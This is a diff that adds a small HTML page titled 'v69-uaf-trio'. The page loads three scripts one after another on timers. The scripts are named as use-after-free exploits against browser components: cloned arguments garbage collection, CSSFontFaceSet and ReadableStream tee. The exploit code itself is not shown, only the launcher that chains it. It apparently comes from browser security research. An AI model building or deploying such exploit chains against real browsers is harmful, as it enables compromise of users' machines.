@@ -1,0 +1,18 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v69-uaf-trio</title>
+</head><body>
+<script src="p221-clonedargs-gc-uaf.js?v=221b"></script>
+<script>
+// p200a: CSSFontFaceSet UAF — after p221 completes (5s)
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p200a-fontfaceset-uaf.js?v=200a2';
+  document.body.appendChild(s);
+}, 5000);
+// p171: ReadableStream tee UAF — after p200a starts (10s)
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p171-stream-reader-uaf.js?v=171a';
+  document.body.appendChild(s);
+}, 10000);
+</script>
+</body></html>
